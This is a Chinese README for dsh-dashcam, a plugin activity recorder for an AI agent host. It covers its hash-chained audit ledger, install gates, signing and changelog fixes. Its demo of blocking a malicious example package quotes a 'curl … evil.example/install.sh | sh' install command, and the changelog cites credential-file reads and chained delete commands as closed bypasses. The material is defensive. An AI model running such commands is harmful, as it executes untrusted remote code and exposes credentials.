# dsh-dashcam

[English](README.md) | **中文**

![CI](https://github.com/odysseykernelt/dsh-dashcam/actions/workflows/ci.yml/badge.svg) ![version](https://img.shields.io/badge/version-2.0.1-blue) ![node](https://img.shields.io/badge/node-%3E%3D%2020-green) ![license](https://img.shields.io/badge/license-MIT-lightgrey) ![status](https://img.shields.io/badge/status-WIP-orange)

**dsh-dashcam 是给 AI 插件装的行车记录仪——它记录插件实际做了什么，不替你决定插件能做什么。**

零配置装上，所有被观测到的活动——读了哪些文件、连了哪些主机、跑了哪些命令、调了哪些工具——都会落进一份防篡改的 JSONL 账本（SHA-256 哈希链，可选 HMAC 封印），每一行都标注是哪个插件干的、这件事发生在契约之下（`profiled: true`）还是之外（`profiled: false`，零契约模式）。不拦任何调用，也不需要插件作者写或声明任何东西——被观测不该成为被观测者的负担。

**装上之后有什么变化**（默认挂载，零契约）：

| | 装之前 | 装之后 |
|---|---|---|
| 插件活动 | 不可见——出了事才知道 | 每次被观测的工具调用逐条记录 |
| 归属 | 靠猜 | 每行都带 `plugin` / `pluginVersion` |
| 有没有契约管着 | 无从知晓 | 每行都带 `profiled` / `manifestHash` |
| 防篡改 | 无 | 哈希链，逐行离线重算可验 |
| 拦截 | — | 无。行车记录仪模式不拒绝任何调用 |

**30 秒看懂零契约**——默认挂载、config 留空，正常干活时 `~/.dsh/dsh-dashcam/ledger.jsonl` 里落的是这些（字段有省略）：

```jsonl
{"v":4,"plugin":"dsh-dashcam-host","capability":"fs","action":"fs.read","scope":{"path":"C:/repo/src/app.ts"},"decision":"allow","ruleId":"unprofiled","profiled":false,"manifestHash":null}
{"v":4,"plugin":"dsh-dashcam-host","capability":"proc","action":"proc.spawn","scope":{"command":"git"},"decision":"allow","ruleId":"unprofiled","profiled":false,"manifestHash":null}
```

之后如果想要「记录之上再判定」，给宿主配置加 `config.requests`（插件声明能做什么）和 `config.grants`（宿主授了什么）——同一条链切换为 Two-Key 判定：声明∩授予 → 放行，否则 advisory 记 would-deny（`enforce: true` 时真拒）。记录与判定共用一本账、同一条链，升级不会分叉你的审计线索。

**行车记录仪的三条诚实原则：**

- **不拦车。** 记账故障从不拒绝调用：默认 fail-open，大声告警 + best-effort 落一条 `ledger_fail` 标记。（要护栏语义可用 `policy.ledger.failMode: 'closed'` 显式回到「写不进账就拒绝执行」。）
- **不撒谎。** 只有真的拒绝了才写 `decision: deny`；`intercepted: true` 意味着真的拦下了未声明调用，不是假设。
- **看不见就说看不见。** 未映射工具按观测逐条记录并带参数预览；挂载记录写明当前处于哪种模式。不存在被包装成「全覆盖」的盲区。

**不放心就别装。** 这是主要建议，不是免责声明：账本本身就是高价值目标（它精确知道你碰过哪些文件、什么时候碰的），宿主适配包跑在 agent 主进程里，而「它只记录」恰恰意味着它什么都看得见。校验 clone 来源，别把账本放进你不信任的备份，在意防篡改就配 HMAC 密钥（`ledgerMacKey`）——或者干脆不装；行车记录仪最不怕的就是这种怀疑。

> **极速上手（一条命令，装出完整插件）**：`dsh plugin --profile web add dsh-dashcam`，重启 DeepSeek Harness 即生效（`--profile desktop` 同样可用）。默认只观察、不拦截任何调用。详见[安装](#安装dsh-宿主)。

行车记录仪下面，是历届版本积攒的全部机器：安装门禁（结构/安全/签名）、能力画像、离线诊断、入站对账。它们照常运行——但在行车记录仪模式下，它们产出的是证据和标签，不是判决。

零第三方依赖，Node.js >= 20（CommonJS）。

## 附录：dashcam 之前的机制（门禁 / 签名 / Two-Key）

下面的附录 A–F 是 1.11.0 转向「记录」之前积累的执行机制。**它们仍然可用、仍在维护（只修 bug），但不再投入新功能。** 产品是行车记录仪——本节之前的内容才是主菜。只有当你想在记录之上加判定（`config.requests` / `config.grants`、Two-Key）或使用安装门禁流水线时才需要读附录；下面的演示照旧可跑。

### 附录 A · 演示：恶意插件在安装期被拦下

对仓库自带[反例包](examples/negative-plugin)跑安装门禁的真实输出——manifest 里 patch 路径越出插件目录、安装脚本把远程脚本直接管道进 `sh`（字段有省略）：

```bash
$ node bin/dsh-dashcam.js gates examples/negative-plugin --skip-signature
{
  "ok": false,
  "blocked": true,
  "plugin": "com.example.leaky",
  "securityLabels": ["SignatureSkipped"],
  ...
  "formatted": [
    "[structure] manifest.json field=patches[0].path — patch 路径越出插件目录",
    "[structure] manifest.json field=scripts.install — 安装脚本不在白名单：curl http://cdn.evil.example/install.sh | sh"
  ],
  "labelLines": [
    "[SignatureSkipped] — 调用方跳过验签，签名状态未知"
  ]
}
```

流水线 fail-fast：`structure` 门直接拦下安装，签名/安全/契约各阶段都不会再跑；每条报错都精确到字段与文件。

### 附录 B · 核心模型

```
manifest 声明 ─┐
               ├─ Two-Key（交集）─→ 守卫链 ─→ 放行 / 拒绝 ─→ Ledger（哈希链）
宿主授予   ─────┘                      ↑
                                  One-Seal / 黑名单 / 完整性
```

- **默认 deny-all**：宿主 `grants` 默认为空。
- **非侵入式防护**：`policy.enforcement.mode` 默认 `advisory`——门禁先装，再输出安全画像标签
  （`Untrusted` / `SignatureSkipped` / `Quarantined` / `ReviewRequired` / `Broken` / `Verified`）；只有恶意脚本与应急黑名单才阻断安装。
  `mode: 'required'` 或企业通道恢复“拒绝安装”语义。
- **legacy 默认配置**：没有 `dashcam` 字段不拒绝解析，自动生成 `{ level: 'legacy', quarantine: true }`；
  没有声明就没有能力（Two-Key 交集为空），企业通道仍然拒绝。
- **能力面**：`fs.*`、`net.outbound`、`net.listen`、`proc.spawn`、`proc.signal`、`env.*`、`cred.*`。凭证路径与环境变量自动升级为 `cred.*`。
- **scope**：路径 glob、`host:port`、环境变量前缀通配、命令基名、端口子集、signal 目标白名单。完整语义见 [docs/SPEC.md](docs/SPEC.md)。
- **审计**：JSONL 追加 + SHA-256 哈希链，字段固定，可逐行离线重算；
  `intercepted=true` 单独记录“实际拦截的未声明 API 调用”，`Ledger.interceptions()` 可直接取出。
- **ingress 观测**：`capability='llm.ingress'` 的请求/入站/异常记录与判定记录同链、同验签，
  但 `metrics` 单独计数，不稀释允许率与拦截率；`ingress --find` 只搜已采样的 head（未采样不覆盖）。

## 1.11.0 改名：dsh-covenant → dsh-dashcam

从 1.11.0 起，本项目改名为 **dsh-dashcam**（产品定位从「契约层」收窄为「插件行车记录仪」：能力声明 + 运行时记录 + 可验证账本）。内部能力模型名称保留为 *dashcam（原 covenant capability model）*，`docs/SPEC.md` 中的不变量语义不变。

**迁移清单（从 1.10.x 升级）**

| 项 | 旧 | 新 |
|---|---|---|
| npm 包名 | `dsh-covenant` | `dsh-dashcam`（未在 npm 发布，无需改依赖声明） |
| CLI | `dsh-covenant` | `dsh-dashcam`（旧命令在 `package.json` 的 `bin` 中保留为别名，指向同一脚本） |
| 宿主包 | `dsh-covenant-host` | `dsh-dashcam-host` |
| 宿主配置条目 | `- id: dsh-covenant-host` | `- id: dsh-dashcam-host`（`config` 内容不变） |
| 默认账本路径 | `~/.dsh/dsh-covenant/ledger.jsonl` | `~/.dsh/dsh-dashcam/ledger.jsonl` |
| 签名格式字段 | `dsh-covenant/signatures@1` | `dsh-dashcam/signatures@1` |
| 契约 spec | `dsh-covenant/1` | `dsh-dashcam/1` |

- **账本自动迁移**：宿主首次启动时，若新路径不存在且旧路径存在，会把旧账本（含 `.guard.log`）原地移到新目录并在日志打印 `账本迁移`；显式配置了 `ledgerPath` 的 profile 不受影响。
- **签名需要重签**：`spec` / `FORMAT` 字段已改，1.10.x 生成的签名包在 1.11.0 下验签会失败（签名字段属于契约的一部分，不做双格式兼容）。
- **历史记录不重算**：账本内容与哈希链原样保留，`pluginVersion` 里的旧值只作历史。

## 1.12.0 新增：ingress 审计（LLM 请求与入站消息对账）

1.11.0 的观测面是「本机执行」：工具、文件、进程、网络。幽灵消息不产生任何这类动作，账本干净是正常的。
1.12.0 补的是另外两条元数据流，落在同一条哈希链上：

| `action` | 记录 |
| --- | --- |
| `llm.request` | 每次请求：消息条数、整体指纹 `messages.hash`、与同 session 上次请求的 `added/removed/changed`、新增消息样本（role / `source.kind` / 长度 / head80 / sha256 / 附件身份）、工具数量与指纹 |
| `llm.inbound` | 每条真正进入会话的输入：`messageId` / `source.kind` / 长度 / sha256 / head80 |
| `llm.anomaly` | 对账失败：`added_user_without_inbound` / `dropped_inbound`；只记录，不拦截 |

口径要点：

- **四象限判据**：只有「inbound 无 + request 有」才是注入；「两边都没有」是模型自造，**不告警**。
  后者正是本次幽灵事件所在的格子——它必须有一条显式回归用例，不能靠人记得。
- **白名单按 `source.kind`，不按 role**：`runtime-context` / `compaction` / `plugin:memory` / `skill-catalog`
  等注入消息的 role 也是 `user`，按 role 白名单会立刻误报。
- **观测记录不是判定**：`capability='llm.ingress'` 不计入 `requests / allows / denies / interceptionRate`，
  另列 `ingressRequests` / `ingressInbound` / `ingressAnomalies`；`decision` 恒为 `allow`，
  异常也不写 `deny`、不写 `intercepted`。
- **只记元数据**：正文不落账；`headBytes: 0` 时连 head 也不存。单条记录受 `maxLineBytes` 约束。
- **fail-open**：记录失败只进降级队列 + `.guard.log`，不影响请求。
- **接线（已核对本机 DSH）**：请求挂 `llm/stream` waterfall（监听器必须 `return next()`），
  入站取 `session/event` 的 `user/message`；不采用 `agent/request`（改不了 messages）
  与 `agent/inbox/spliced`（投递事件，条目可被取消）。
- **首请求建基线**：中途接入宿主时，历史消息全部算「新增」但没有 inbound 可比，首次请求不告警。
- **已知边界**：本地 egress 只能证明「客户端发出去的 messages 里有没有 X」。服务端在客户端之后
  追加的前缀不在观测范围；`coverage.unknown` 只是辅助信号，不能当实锤。

## 快速开始

```bash
npm test          # 全量用例：契约、运行时、绕过、门禁、签名、画像、诊断、治理、审计、准入
node bin/dsh-dashcam.js help
node bin/dsh-dashcam.js verify-ledger ~/.dsh/dsh-dashcam/ledger.jsonl   # 离线验链（不依赖宿主进程）
node bin/dsh-dashcam.js behavior ~/.dsh/dsh-dashcam/ledger.jsonl        # 行为画像：各插件实际读了什么/连了哪里/跑了什么
node bin/dsh-dashcam.js rotate ~/.dsh/dsh-dashcam/ledger.jsonl --max-bytes 52428800   # 归档当前段，新段以首尾 hash 链接
node bin/dsh-dashcam.js redact ~/.dsh/dsh-dashcam/ledger.jsonl --out share.jsonl      # 分享前把 home 折叠成 $HOME（保留归属字段）
node bin/dsh-dashcam.js ingress ~/.dsh/dsh-dashcam/ledger.jsonl --session <id>
node bin/dsh-dashcam.js ingress ~/.dsh/dsh-dashcam/ledger.jsonl --find "状态栏"
node bin/dsh-dashcam.js draft ~/.dsh/dsh-dashcam/ledger.jsonl            # 从观测行为反推 requests 草案（需人工收敛）
node bin/dsh-dashcam.js bench --n 10000                                 # 「被记录」的每次调用开销（guarded vs 裸 fs）
```

> **分享账本前**：记录里含绝对路径与命令元数据。先跑 `redact`——home 前缀折叠成 `$HOME`，重算成一条全新可验的链；`plugin` / `pluginVersion` / `profiled` 原样保留——谁干的留下，你住哪抹掉。

> **被记录的代价**：每次改完 bridge 跑一遍 `node bin/dsh-dashcam.js bench`。Windows 开发机实测（1.12.x），一次被记录的 `fs` 调用约多花 **1.1–1.5 ms**（守卫判定 + 逐条落账，同步账本写入占大头；裸 `fs` 为 0.04–0.5 ms）。数字与机器相关——请自己测，别抄。

## 目录

```
src/
  contract/   能力分类、manifest 解析、Two-Key、Charter/Sieve
  runtime/    推导、守卫链、One-Seal、Ledger、Bridge
  handles/    能力句柄（封闭的 fs facade）
  gates/      结构、安全、可装载性、安装流水线
  signing/    Ed25519 双签、信任表
  portrait/   能力画像卡（三档）
  autopsy/    离线诊断（六段）+ bundle patch 组合
  governance/ 三级回滚、黑名单、月度度量、熔断
  host/       LocalHost：装 → 注册 → 调用 → 卸载
bin/          CLI
dsh-dashcam-host/  宿主适配：插件入口（判定链）、浏览器面板、构建脚本
docs/         规范、上线节奏、合规
examples/     正例包、反例包、演示策略
test/         契约、运行时、绕过、门禁、签名、画像、诊断、治理、审计、准入
```

## 宿主集成

```js
const { activate } = require('dsh-dashcam/core');

const plugin = activate({
  manifest,                 // 已解析的 manifest
  grants,                   // 宿主授予项；默认空 = deny-all
  policy,                   // 见 src/policy.js 默认策略
  ledgerPath: '.dsh-ledger.jsonl',
  pluginRoot: '/path/to/plugin',
  registerPreExecute: (check) => host.use(check),  // 宿主 pre-execute 钩子
});

// 卸载
plugin.deactivate();
```

`activate` 会在守卫入口安装原生模块 Hook（看护进程内 `fs/net/child_process/env` 调用）并注册 pre-execute 判定函数。
如果宿主只想要判定、不想打补丁，传 `patchBuiltins: false`。

## 安装（DSH 宿主）

一条命令装出完整插件——判定链、账本、Agent Dashcam 浏览器面板：

```bash
dsh plugin --profile web add dsh-dashcam      # 或：dsh plugin --profile desktop add dsh-dashcam
```

装完重启 DeepSeek Harness。**默认只观察、不拦截**：被映射到的工具调用逐条落账，不拒绝任何调用——想要「记录之上再判定」需显式开启（`config.requests` / `config.grants` + `enforce: true`）。

**支持的 profile**：`desktop` / `web`。判定链与账本跑在宿主主进程，两种 profile 下都生效；浏览器面板面向 web 客户端（发布包里 `dsh.client.platform: web`）。

**装上后应该看到什么。** 启动时宿主日志（`%APPDATA%\@deepseek-ai\dsh-desktop\logs`）出现：

```
[dsh-dashcam] 判定链已挂载（event=tools/pre-execute，mode=unprofiled，enforceUnmapped=false，commandlineArchive=hash，patchBuiltins=false，ledger=C:\Users\you\.dsh\dsh-dashcam\ledger.jsonl，requests=0，grants=0）
```

之后每次被观测的工具调用落进 `~/.dsh/dsh-dashcam/ledger.jsonl`（字段有省略）：

```jsonl
{"v":4,"plugin":"dsh-dashcam-host","pluginVersion":"1.14.0","capability":"fs","action":"fs.read","scope":{"path":"C:/repo/src/app.ts"},"decision":"allow","ruleId":"unprofiled","profiled":false,"manifestHash":null,"seq":1,"ts":"2026-11-09T14:09:14.822Z","prevHash":"GENESIS","hash":"b504c225…"}
```

整条链随时可离线复验——不需要宿主进程：

```bash
npx dsh-dashcam verify-ledger ~/.dsh/dsh-dashcam/ledger.jsonl
```

```json
{
  "ok": true,
  "records": 2,
  "lastSeq": 2,
  "head": "6003e9f193a63198cfbc2039f296029d669d98337cb52c213da5e21238f5300b",
  "macVerified": false,
  "errors": []
}
```

**卸载**同样一条命令：`dsh plugin --profile web remove dsh-dashcam`——判定链摘除，无残留 Hook。

**从 link 安装升级（2.0 之前）**：把 profile 的 `package.json` 里 `"dsh-dashcam-host": "link:…"` 依赖和 `dsh.profile.bundles` 里的 `dsh-dashcam-host` 条目删掉，再用上面一条命令安装。默认账本路径不变（`~/.dsh/dsh-dashcam/ledger.jsonl`），历史记录与哈希链原样保留——无需手动迁移。

适配包默认 `patchBuiltins: false`：宿主是 Electron 主进程，Bridge 是进程级补丁，直接装上会接管
应用自身的 fs/net，所以默认只注册 pre-execute 判定函数。需要真实拦截时在 cordis 配置里显式
`patchBuiltins: true`（语义见上文「宿主集成」）。

## CLI

```bash
# 生成发布者/审核者密钥与信任表
node bin/dsh-dashcam.js keygen ./keys

# 双签（发布者 + 审核者）
node bin/dsh-dashcam.js sign ./plugin --plugin com.example.plugin --version 1.0.0 \
  --publisher-key keys/publisher.private.pem --publisher-key-id publisher-2026a \
  --reviewer-key  keys/reviewer.private.pem  --reviewer-key-id  reviewer-2026a

# 验签（重建清单 → keyId → 发布者 → 审核者）
node bin/dsh-dashcam.js verify ./plugin --trust keys/trust.json

# 安装门禁（黑名单 → 验签 → 结构 → 契约 → Sieve → 安全 → 可装载性）
node bin/dsh-dashcam.js gates ./plugin --trust keys/trust.json --host --policy examples/demo-policy.json
node bin/dsh-dashcam.js gates examples/negative-plugin --skip-signature   # 反例包：恶意脚本被阻断（ok=false）

# 能力画像 / 离线诊断 / 度量 / 黑名单 / 熔断
node bin/dsh-dashcam.js portrait ./plugin
node bin/dsh-dashcam.js autopsy ./plugin --profile profile.json --patch patch.json
node bin/dsh-dashcam.js metrics .dsh-ledger.jsonl --events events.json
node bin/dsh-dashcam.js blacklist blacklist.json add com.example.evil 紧急下架
node bin/dsh-dashcam.js rollout metrics.json

# 从观测到契约：反推声明草案，再量代价
node bin/dsh-dashcam.js draft ~/.dsh/dsh-dashcam/ledger.jsonl --manifest ./plugin   # 已声明的能力不再重复建议
node bin/dsh-dashcam.js bench --n 10000
```

失败报告精确到字段与文件行，例如：

```
[structure] manifest.json field=patches[0].path — patch 路径越出插件目录
[safety] index.js:14 field=dashcam.capabilities.requests — 代码使用 net.outbound，但 manifest 未声明
```

### 附录 C · 示例包

- [examples/compliant-plugin](examples/compliant-plugin)：声明 fs/net/env，Charter 完整，可过全部门禁（配合 `examples/demo-policy.json` 的授予集）。
- [examples/negative-plugin](examples/negative-plugin)：越界 patch、空 reason、非白名单安装脚本、未声明 `proc.spawn` / `cred.read` / `net.outbound`。用于验证契约层与门禁。

正例包的完整流程：

```bash
node bin/dsh-dashcam.js keygen ./keys
node bin/dsh-dashcam.js sign examples/compliant-plugin --plugin com.example.compliant --version 1.0.0 \
  --publisher-key keys/publisher.private.pem --publisher-key-id publisher-2026a \
  --reviewer-key keys/reviewer.private.pem --reviewer-key-id reviewer-2026a
node bin/dsh-dashcam.js gates examples/compliant-plugin --trust keys/trust.json \
  --host --policy examples/demo-policy.json
```

## 安全边界（必读）

Bridge 保护的是**安装后**的进程内调用，不是沙箱。覆盖是补丁式的：`bridge.coverage()` 会返回
`guarded` 清单和 `knownGaps`，请把后者当成能力清单的上界，而不是噪音。

```js
const report = bridge.coverage();
// { entries: 110, guarded: ['fs.open', 'fs.openSync', 'net.Socket#connect', ...],
//   knownGaps: ['worker_threads / vm / 原生扩展', 'Bridge 安装前打开的文件描述符', ...] }
```

- 插件在 Bridge 安装前缓存/解构的函数引用不受保护；宿主应在安装 Bridge 后只通过受控入口调用插件。
- 原生扩展、`worker_threads`、`vm` 生成代码、直接系统调用不在 Node 层拦截范围。
- 静态扫描给出的是“扫描结果”，不是安全证明；画像卡固定展示 `未扫到 ≠ 安全`。
- 完整性校验能发现“已包装函数被替换”，不能发现“从未包装的入口”。
- **句柄准入即关口**：`open` 通过后 fd 级调用直通；因此不要以为“包了 readFileSync 就守住了读文件”。
- **装载窗口是残余风险，不是优点**：`require` 期间插件顶层代码的越界调用会被改写为放行并按 `deny` 记账
  （`intercepted=true`），但不会被打断——这是为 legacy 插件保留的一次性信任让步，装的时候已经发生的读取收不回来；
  未签名 consumer 默认放行的组合下，等于新插件的顶层代码有一次越权机会。可用
  `policy.enforcement.observeLoadWindow = false` 关闭（装载期越界直接拒绝装载）；`strictPatch = true`
  时窗口强制关闭且不可用配置重开；装载结束若有越界放行，会打 warning 告警（`stats.observed > 0`）。

### 附录 D · 能力句柄：把补丁换成小世界（1.2.0 实验）

Bridge 只能做到「我想到的都包了」。想真正做到「没声明就做不到」，得反过来：不给插件全局 API，只给它一个受限对象。

```js
const { createCapabilityHandles } = require('dsh-dashcam/core');

const handles = createCapabilityHandles({ guard });
await handles.fs.promises.readFile('cache.json');   // 过守卫链
handles.fs.readSync;                                 // undefined：这个方法不存在
handles.fs.coverage();                               // { closed: true, methods: [...] }
```

- 方法集合是手写闭集，没有 `knownGaps` —— 不存在就是不存在。
- 只接受路径，不接受 fd；`open()` 返回受限 `FileHandle`，没有 `fd` 属性。
- `flags` 决定能力面（`r+` 要读+写），`copyFile` / `rename` 同时判定读写。
- 对象冻结，插件改不掉守卫。

现在只覆盖 `fs`。`net` / `proc` 按同一模式扩展：一个方法一次 `guard.enforce`。

### 附录 E · 能力注入：让 require('fs') 可选返回句柄（1.5.0）

句柄再好，插件不用也没用。但封闭面天生不完整——`openSync`、`fs.promises.open`、`watch`、`globSync`
在句柄里都没有，默认开它会直接把存量插件打成 `TypeError`。所以 `LocalHost` 与 `activate()` 都默认
`sandbox.mode = 'global'`，只靠 Bridge 守卫；`handles` 是宿主显式选择的沙箱模式：

```js
// global（默认）：插件代码完全不用改
const fs = require('node:fs');
fs.readFileSync('cache.json');   // 原生 fs → 过 Bridge 守卫链
fs.openSync('cache.json', 'r');  // 同样可用

// handles（显式开启，需要插件使用 ctx.handles）
fs.readSync(fd, ...);            // TypeError: 这个方法不存在
```

- 装载期间安装 `Module._load` 重定向，`fs` / `node:fs` / `fs/promises` 都换成句柄。
- **只对插件目录下的模块生效**，宿主的 `require('fs')` 不受影响；插件自带 `node_modules` 依赖也在 pluginRoot 之内，同样被重定向。
- 顺序有讲究：Bridge 先装（它自己要用原生 fs），重定向后装，否则会递归。
- `sandbox.mode = 'handles'` 是显式沙箱开关：拿封闭面，要求插件走 `ctx.handles`。
- `ctx.handles` **始终可用**（默认 `global` 下也是）：新插件可以只走句柄，不必先切模式；
  `sandbox.mode` 只决定 `require('fs')` 是否被重定向。
- 默认值必须保可用性：不开 `handles`，存量插件零改动即可运行。

### 附录 F · 为什么是非侵入式

安装门禁的职责不是“替用户决定装不装”，而是**把风险讲清楚，并把执行点留在宿主**：

- 门禁先装、再标注：未签名 / 缺 Charter / 静态扫描异常 / 装不起来，分别输出
  `Untrusted` / `ReviewRequired` / `Broken` 标签，画像卡首屏可见，不再用“拒装”掩盖信息。
- 只有**恶意脚本**（越界 patch、非白名单安装脚本、entry 越界）与**应急黑名单**才阻断；
  它们不是“配置不合规”，而是明确的攻击面。
- 真正的边界在运行时：`LocalHost.install` 自己跑完整门禁，`guard.installNativeHooks()` 把
  `fs/net/child_process` 的实际调用接进同一条 Two-Key 守卫链，未声明调用记 `intercepted=true`。
- 声明（declaration）只是**能力请求**，不是合规姿态；宿主授予（grant）才是唯一的钥匙。

## 文档

- [docs/SPEC.md](docs/SPEC.md)：能力分类、scope 语义、Two-Key、Ledger、门禁、签名、画像、Autopsy。
- [docs/ROLLOUT.md](docs/ROLLOUT.md)：六阶段上线、熔断阈值、三级回滚、双钥轮换、应急下架、月度度量、
  以及**上线前的宿主责任清单**（TOCTOU / 原生扩展 / 账本可写性 / 密钥托管 / 沙箱模式，逐项可勾）。
- [docs/COMPLIANCE.md](docs/COMPLIANCE.md)：Charter 字段、默认值、Sieve 判定与通道策略。

> 🥚 **彩蛋**：[docs/ghost-in-the-llm/](docs/ghost-in-the-llm/) 是 1.12.0 ingress 审计的动机档案——
> 一次真实的「来源不明的用户消息」事件（幽灵消息）的完整取证、两轮自我推翻的复盘、
> 第三方复核，以及由它催生的 ingress 设计。全部标识符、消息原文与内部组件名/路径均已
> 脱敏为占位符，读完 SPEC 之后再去看，会对「为什么要有对账记录」多一层体感。

## 1.10.12 修复（1.10.12 复核 F5 后半：metrics 口径排除 telemetry 附加记录）

来自 `handoff/dsh-dashcam-review-1.10.12-2026-11-06.md` 的遗留项（核心侧）。此前宿主
适配层（dsh-dashcam-host）直接 `ledger.append` 的 telemetry 附加记录（mount /
unmapped-tool / unjudgeable-tool / `proc.commandline` 存档，capability 固定为
`telemetry`）被计入 metrics 的 allow/deny 口径——它们不是 Two-Key 判定，会同时污染
三个读数：拦截率被 commandline 存档凭空稀释一半；`enforceUnmapped` 下 unmapped-tool
遥测的 `deny + intercepted=true` 被误算成「未声明越权拦截」；`grantDenialRate` 分母被
遥测 deny 抬高。现在 `computeMetrics` / `monthlyMetrics` 的判定读数只收
`capability !== 'telemetry'` 的记录，telemetry 数量与其中 deny 条数另列并列读数
`telemetryRecords` / `telemetryDenies`（可见性不丢）；`records()` / `verify()` 等
离线审计仍看全量行。没有 telemetry 记录的旧账本读数完全不变（新增 7 项口径护栏
用例证明，总回归 241 例 0 fail）。口径文档见 [docs/ROLLOUT.md](docs/ROLLOUT.md) 第 6 节。
宿主适配层 `dsh-dashcam-host` 亦自本版起以 git subtree 并入本仓库（历史完整保留，见
[dsh-dashcam-host/](dsh-dashcam-host/README.md)），不再依赖工作区的兄弟目录路径。

## 1.10.13 修复（1.10.13 复核 R1–R3 批：目录探测负缓存 / 拒绝落账 / allowlist fail-fast）

来自 `handoff/dsh-dashcam-review-1.10.13-2026-11-06.md` 的残余项（只动宿主子目录，核心
src/ 无改动，宿主 PLUGIN_VERSION → 1.10.14）：

- **R1（fail-open → 修正）**：L4 目录探测缓存原本正负结果都缓存——「先删文件、30s 内
  换成目录再删」会让 `deleteRequests` 只判节点、跳过子树判定，仅授节点删除权即可删整棵
  树（绕过 M1）。现在**只缓存正结果（isDir=true）**：负结果每次 fresh 探测，正缓存方向
  是 fail-closed（目录被换成文件后仍多判一条子树），可接受。
- **R2（审计不去重）**：`enforceUnmapped` 的拒绝此前遥测去重只落一条账——3 次拦截账上
  只有 1 条，`telemetryDenies` 少计。现在拒绝**每次**都追加 unmapped-tool deny 记录，
  console 点名与 allow 遥测仍同名只记一次。
- **R3（fail-fast）**：`unmappedAllowlist` 误写成逗号分隔字符串时原静默按空数组处理，
  开了 `enforceUnmapped` 会把本想豁免的工具全拦掉且无告警。现在非数组直接拒绝挂载并
  指明数组写法。
- 冒烟 91 → **96 项全过**（R1/R2/R3 各补用例，`file→dir` 替换场景实测子树判定仍在）。
- R4（部署）：桌面 profile 的宿主 link 同批切换到仓内副本（见 HANDOFF）。

## 1.10.11 修复（1.10.10 两份复核报告 P1–P9 批）

来自 `handoff/dsh-dashcam-review-1.10.10-2026-11-06.md` 与
`handoff/dsh-dashcam-host-ops-mapping-1.10.10-2026-11-06.md`。
本版**只改宿主适配层**（`dsh-dashcam-host`），核心 `src/` 无改动，234 例回归不受影响。

- **P1/P8 copy/move 双端判定**：此前 `ops_copy` / `ops_move` 只按源路径记 `fs.write`，
  目标端完全不判——enforce 下「源在域内、目标在域外」可把数据搬出授权域。现在
  copy = `fs.read`(源) + `fs.write`(目标)，move = `fs.read` + `fs.delete`(源) + `fs.write`(目标)，
  `ops_remove` 改记 `fs.delete`（破坏性动作不再伪装成写）。
- **P2 核心工具 `edit` 未映射**：`WRITE_TOOLS` 补 `edit`，插件改文件不再漏账。
- **P3 `ops_batch` 整块隐身**：一次可 plan/resume/run 512 条 copy/move/remove。现在按
  `operations[]` 逐条展开判定，enforce 整批按最严处置；缺 `operations[]`（resume/plan）或
  超限时无法判定子操作——advisory 落 `unjudgeable` 遥测，enforce fail-closed 拒绝。
- **P4 `ops_read_files` 只记首个 path**：`files[]` 逐 path 判定记账，`files[1..]` 的越界读
  （如 `.ssh/id_rsa`，自动升级 `cred.read`）不再静默通过。
- **P5 `glob`/`grep` 缺 path**：DSH 默认走 session cwd，宿主拿不到，不猜路径写假账；
  改落 `unjudgeable` 遥测（advisory 放行 / enforce 拒绝），缺口可见。
- **P6 命令判定只认首词**：`cd X && rm -f …` 在账上只剩 `cd`。新增
  `proc.commandline` 审计记录（长 1024 截断 + `sha256` 整串），判定口径仍为首词。
- **P7 未映射遥测只在 stdout**：桌面版看不到 stdout，覆盖缺口等于不存在。未映射工具
  与挂载事件（`telemetry/mount`）一并落账本，同名仍只记一次。
- **P9 `dryRun` 被记成实写**：`write_file` / `edit_file` / `replace` 带 `dryRun: true`
  时降级为 `fs.read`，账本不再高估副作用。
- **D4 账本 MAC 密钥透传**：`config.ledgerMacKey` / `ledgerMacKeyFile` / `ledgerMacKeyEnv`
  直通 dashcam（v3 账本 HMAC），密钥过短则 activate 失败不挂载。
- **测试 profile 账本隔离**：`dashcam-test` profile 的 `ledgerPath` 指向
  `ledger-dashcam-test.jsonl`，测试期 deny 记录不再混入生产底账。
- 回归：宿主冒烟 28 项 → 57 项全过（copy/move 越界拦截、batch 展开与整批拒绝、
  逐 path、命令行存档、dryRun、MAC 均有用例）。
- 已知边界（未变）：`replace` 以基目录为审计粒度，glob 命中的实际文件不逐个展开；
  `ops_bash` 里 `bash -c "…"` 套娃只判首词；Bridge 仍默认 `patchBuiltins: false`。

## 1.10.10 修复（宿主映射补齐 ops_ 前缀）

- **`ops_*` 前缀导致映射全空**：dsh-ops 把工具公开名统一加前缀（`ops_bash` /
  `ops_read_files` / `ops_write_file` / `ops_copy` / `ops_move` / `ops_remove` …），
  旧映射按裸名匹配，一条都命中不了——shell 主力通道从未进账本。现在先剥 `ops_`
  再按裸名匹配，前缀组合不再逐个枚举。
- **未映射工具遥测**：未列入映射表的工具放行但点名（`console.info`，同名去重），
  让覆盖缺口可见、可补，而不是静默绕过。
- 回归：宿主冒烟扩至 28 项（`ops_bash` 的 command/script_path 两形态、`files` 数组、
  glob/grep/stat/diff 只读口径、copy/move/remove 记账）。

## 1.10.9 修复（1.10.8 复核 P1 清单批）

1.10.8 复核报告（2026-11-06）确认修复有效，同时点名 P1 清单一项未动，本版逐条关闭：

- **M1 socketPath 双轨统一**：`net.connect({ path })` / `net.connect('path')`
  （Unix socket / 具名管道）此前在句柄层被拒、Bridge 层却折算成
  `{ host:'localhost', port:0 }` 落 Two-Key 判定（可能被 host 授予放行）。
  现在 Bridge 层直接拒绝（ruleId `socket_path`，先记账再抛），与句柄层同口径。
- **M4 maxMessageBytes**：`ChildHost` 双向消息上限落地（默认 1 MiB，
  `policy.limits.maxMessageBytes`，下限 1024）。入向超限丢弃；出向响应超限降级为
  小体积 `response_too_large` 错误响应（避免子进程永久挂起）；invoke 请求超限
  发送前即抛（code `message_too_large`）。`messageSizeBytes` 对循环引用返回
  Infinity（fail-closed）。
- **M5 ipcTimeoutMs**：`ChildHost` 接受 `ipcTimeoutMs`（0 = 不限时，负数回落默认
  5000ms），旧参数名 `invokeTimeoutMs` 保持兼容；`policy.limits.ipcTimeoutMs` 为
  正式配置入口。
- **M8 strictPatch 接入 createPluginRuntime/activate**：此前只有 LocalHost 装载
  路径检查 Hook coverage，直连路径装了 Hook 却从不校验。现在
  `policy.enforcement.strictPatch === true` 时 coverage 不完整 → 卸载 Hook →
  拒绝装载（`沙箱补丁不完整，按 strictPatch 拒绝装载：…`），与 LocalHost 同语义。
- **M11 safetyStage.errors 不再清空**：错误转完标签就抹掉导致证据丢失、strict 模式
